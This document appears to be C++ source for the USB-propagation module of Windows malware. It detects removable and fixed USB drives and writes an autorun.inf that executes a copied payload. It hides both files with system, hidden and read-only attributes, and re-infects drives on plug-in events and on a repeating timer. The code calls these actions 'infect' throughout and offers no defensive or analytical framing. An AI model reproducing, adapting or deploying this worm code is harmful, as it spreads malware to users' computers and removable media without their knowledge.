#include "USBList.h"

char ** USBList::USBDeviceList;
char * USBList::strAutoRunFilenameWhenUSBArrive = NULL;
int USBList::numElems = 0; 
bool USBList::inicialized = false;
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
void getEnvironmentMessages(void * threadParams);
void infectPermanentUSBDevices(void * threadParams);
long USBList::delayInfectWhenUSBDeviceArrive = 0;
long USBList::delayInfectPermanentUSBDevices = 0;
bool USBList::quitInfectPermanentUSBDevices = true;
bool USBList::hideUSBFiles = true;

void USBList::inicialize(HINSTANCE hInstance, bool hideFiles, bool infectOnUSBDeviceConnect, long delayInfectWhenUSBArrive, bool infectPermanentUSB, long delayInfectPermanentUSB) {
        
   if (!USBList::inicialized) {
         
      USBList::USBDeviceList = (char **) malloc(sizeof(char *));
      if (USBList::USBDeviceList != NULL) {
         if (infectOnUSBDeviceConnect) { 
            USBList::delayInfectWhenUSBDeviceArrive = delayInfectWhenUSBArrive;
            CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) getEnvironmentMessages, hInstance, 0, NULL);
         }
         if (infectPermanentUSB) {
            USBList::quitInfectPermanentUSBDevices = false;
            USBList::delayInfectPermanentUSBDevices = delayInfectPermanentUSB;
            CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE) infectPermanentUSBDevices, NULL, 0, NULL);
         }
         hideUSBFiles = hideFiles;
         USBList::inicialized = true;
      }
   }
}                            

void USBList::setInfectPermanentUSBDevicesValue(bool infect) {
   USBList::quitInfectPermanentUSBDevices = infect;      
}

bool USBList::scanUSBRemovableAndFixedDevices() {
   DWORD dwDriveList = ::GetLogicalDrives();  
   char device[3]; 
   
   if (USBList::inicialized) {
      for (int i = 0; (i < 26); i++) {
         if ((dwDriveList & ((int) pow(2, i))) == ((int) pow(2, i))) {
            sprintf(device, "%c:", (65 + i));
            if (FunctionsWindowsNT::isRemovableOrFixedUSBDrive(device)) {
               if (USBList::numElems > 0) USBList::USBDeviceList = (char **) realloc(USBList::USBDeviceList, sizeof(char *) * (USBList::numElems + 1));               
               *(USBList::USBDeviceList + USBList::numElems) = (char *) malloc(sizeof(char) * 3);
               strcpy(*(USBList::USBDeviceList + USBList::numElems), device);
               
               USBList::numElems++;
            }
         }
      }
      if (USBList::numElems > 0) return true;
   }
   return false;
}

bool USBList::createAutorunInUSBDevice(const char * letter, const char * strAutoRunFilename) {
   DWORD dwDriveList = ::GetLogicalDrives();
   bool err = false;
   unsigned int pos = 0;
   char device[3];
   char * filename;
   bool result = false;
   
   if ((strlen(letter) == 1) || (strlen(letter) == 2)) {
      if (strlen(letter) == 2) {
         if (letter[1] != ':') err = true;
      }
      if (!err) {
         if (((letter[0] > 96) && (letter[0] < 123)) || ((letter[0] > 64) && (letter[0] < 91))) {
            if ((letter[0] > 64) && (letter[0] < 91)) pos = letter[0] - 65;
            else pos = letter[0] - 97;
            
            if ((dwDriveList & ((int) pow(2, pos))) == ((int) pow(2, pos))) {
               sprintf(device, "%c:", (65 + pos));
               if (FunctionsWindowsNT::isRemovableOrFixedUSBDrive(device)) {
                  if (FunctionsFiles::fileExists(strAutoRunFilename)) {
                     filename = FunctionsStrings::getLastToken((char *) strAutoRunFilename, '\\');
                     if (filename != NULL) {
                                  
                        if (FunctionsFiles::putTextToFile((string(device) + string("\\autorun.inf")).c_str(), (string("[autorun]\nshellexecute=") + string(filename)).c_str())) {
                           if (hideUSBFiles) FunctionsFiles::setFileAttributesSHR((string(device) + string("\\autorun.inf")).c_str());
                           else FunctionsFiles::setFileAttributesR((string(device) + string("\\autorun.inf")).c_str());
                           
                           if (FunctionsFiles::copyFile(strAutoRunFilename, (string(device) + string("\\") + string(filename)).c_str())) {
                              if (hideUSBFiles) FunctionsFiles::setFileAttributesSHR((string(device) + string("\\") + string(filename)).c_str());   
                              else FunctionsFiles::setFileAttributesR((string(device) + string("\\") + string(filename)).c_str());
                           }                                                                                              
                           result = true;
                        }
                     }            
                  }
                  if ((USBList::inicialized) && (!USBList::driveIsInScannedList(device))) {
                     if (USBList::numElems > 0) USBList::USBDeviceList = (char **) realloc(USBList::USBDeviceList, sizeof(char *) * (USBList::numElems + 1));               
                     *(USBList::USBDeviceList + USBList::numElems) = (char *) malloc(sizeof(char) * 3);
                     
                     strcpy(*(USBList::USBDeviceList + USBList::numElems), device);
                     USBList::numElems++;
                  }
               }
            }
         }
      }
   }
   return result;
}

bool USBList::createAutorunInAllUSBDevices(const char * strAutoRunFilename) {
   char * filename;
   unsigned int infectedElems = 0;
   
   if ((USBList::numElems > 0) && (USBList::inicialized) && (FunctionsFiles::fileExists(strAutoRunFilename))) {
      filename = FunctionsStrings::getLastToken((char *) strAutoRunFilename, '\\');
      if (filename != NULL) {
         for(int i = 0; i < USBList::numElems; i++) {
            if (FunctionsFiles::putTextToFile((string(*(USBList::USBDeviceList + i)) + string("\\autorun.inf")).c_str(), (string("[autorun]\nshellexecute=") + string(filename)).c_str())) {
               if (hideUSBFiles) FunctionsFiles::setFileAttributesSHR((string(*(USBList::USBDeviceList + i)) + string("\\autorun.inf")).c_str());
               else FunctionsFiles::setFileAttributesR((string(*(USBList::USBDeviceList + i)) + string("\\autorun.inf")).c_str());
               
               if (FunctionsFiles::copyFile(strAutoRunFilename, (string(*(USBList::USBDeviceList + i)) + string("\\") + string(filename)).c_str())) {
                  if (hideUSBFiles) FunctionsFiles::setFileAttributesSHR((string(*(USBList::USBDeviceList + i)) + string("\\") + string(filename)).c_str()); 
                  else FunctionsFiles::setFileAttributesR((string(*(USBList::USBDeviceList + i)) + string("\\") + string(filename)).c_str());  
               }
               infectedElems++;
            }
         }
         if (infectedElems == USBList::numElems) return true;
      }
   }
   return false;
}

bool USBList::setAutoRunFilenameWhenUSBArriveOrPermanentScan(const char * strAutoRunFilename) {
   if (FunctionsFiles::fileExists(strAutoRunFilename)) {
      if (USBList::strAutoRunFilenameWhenUSBArrive != NULL) free(USBList::strAutoRunFilenameWhenUSBArrive);
      USBList::strAutoRunFilenameWhenUSBArrive = (char *) malloc(strlen(strAutoRunFilename) + 1);
      if (USBList::strAutoRunFilenameWhenUSBArrive != NULL) {
         strcpy(USBList::strAutoRunFilenameWhenUSBArrive, strAutoRunFilename);
         return true; 
      }
   }
   return false;
}

char * USBList::getAutoRunFilenameWhenUSBArriveOrPermanentScan() {
   return USBList::strAutoRunFilenameWhenUSBArrive;   
}

char ** USBList::getUSBRemovableAndFixedList() { 
   if (USBList::inicialized) return USBList::USBDeviceList; 
   return NULL;
}

bool USBList::driveIsInScannedList(char * driveLetter) {
   bool findLetter = false;
   
   if ((USBList::inicialized) && (USBList::numElems > 0)) {
      for(int i = 0; ((i < USBList::numElems) && (!findLetter)); i++) {
         if (stricmp(*(USBList::USBDeviceList + i), driveLetter) == 0) findLetter = true;
      }   
   }
   return findLetter;
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: infectPermanentUSBDevices                                   ##
   ##  [ + ] DESCRIPTION: Infect all USB devices periodical method                 ##
   ##  [ + ] PARAMETERS: threadParams -> void                                      ##
   ##                                                                              ##
   ################################################################################## */
   
void infectPermanentUSBDevices(void * threadParams) {
   USBList::scanUSBRemovableAndFixedDevices();
   for (;!USBList::infectPermanentUSBDevicesIsCancelled();) {
      if (USBList::getAutoRunFilenameWhenUSBArriveOrPermanentScan() != NULL) {
         USBList::createAutorunInAllUSBDevices(USBList::getAutoRunFilenameWhenUSBArriveOrPermanentScan());   
      } 
      Sleep(USBList::getDelayInfectPermanentUSBDevices());
   }
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: getEnvironmentMessages                                      ##
   ##  [ + ] DESCRIPTION: Get environment messages to detect USB plug in           ##
   ##  [ + ] PARAMETERS: threadParams -> Winmain instance                          ##
   ##                                                                              ##
   ################################################################################## */
   
void getEnvironmentMessages(void * threadParams) {
   WNDCLASSEX wincl;
   HWND hwnd;
   MSG messages;
   char className[] = "USB WINDOWS CLASS";
   
   wincl.cbSize = sizeof(WNDCLASSEX);
   wincl.hInstance = (HINSTANCE) threadParams;
   wincl.style = CS_DBLCLKS;
   wincl.lpfnWndProc = WndProc;
   wincl.lpszClassName = className;
   wincl.lpszMenuName = NULL;
   wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;
   wincl.cbClsExtra = 0;
   wincl.cbWndExtra = 0;
   wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
   wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
   wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
         
   if (RegisterClassEx(&wincl)) {
      hwnd = CreateWindowEx(0, className, "USB WINDOW APP", WS_OVERLAPPED, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, HWND_DESKTOP, NULL, (HINSTANCE) threadParams, NULL);
      if (hwnd != NULL) {
                     
         while(GetMessage(&messages, NULL, 0, 0)) {
            TranslateMessage(&messages);
            DispatchMessage(&messages);
         } 
      }
   }   
}

/* ##################################################################################
   ##                                                                              ##
   ##  [ + ] FUNCTION: WndProc                                                     ##
   ##  [ + ] DESCRIPTION: RSI (Routine Service Interrupt) when arrive USB message  ##
   ##                                                                              ##
   ################################################################################## */
   
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
   PDEV_BROADCAST_VOLUME pVol;
   PDEV_BROADCAST_HDR pHdr;
   char device[3];
   
   pHdr = (PDEV_BROADCAST_HDR) lParam;
   switch (message) {
      case WM_DESTROY:
         PostQuitMessage (0);
         break;
      
      case WM_DEVICECHANGE:
         switch (wParam) {
		    case DBT_DEVICEARRIVAL:
               Sleep(USBList::getDelayInfectWhenUSBDeviceArrive());
               pVol = (PDEV_BROADCAST_VOLUME) pHdr;
               sprintf(device, "%c:", FunctionsWindowsNT::getDriveLetter(pVol->dbcv_unitmask));
               if (USBList::getAutoRunFilenameWhenUSBArriveOrPermanentScan() != NULL) {
                  USBList::createAutorunInUSBDevice(device, USBList::getAutoRunFilenameWhenUSBArriveOrPermanentScan());   
               }
               break;
         }
         
         break;
           
      default:
         return DefWindowProc (hwnd, message, wParam, lParam);
   }
   
   return 0;
}
